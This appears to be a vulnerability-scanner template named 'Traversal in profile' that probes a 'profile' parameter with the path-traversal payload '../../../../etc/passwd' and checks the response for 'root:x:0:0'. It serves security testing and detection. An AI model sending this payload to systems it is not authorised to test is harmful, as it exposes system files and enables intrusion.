id: lfi6-1300
name: 'Traversal in profile'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via profile'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      profile:
        - '../../../../etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
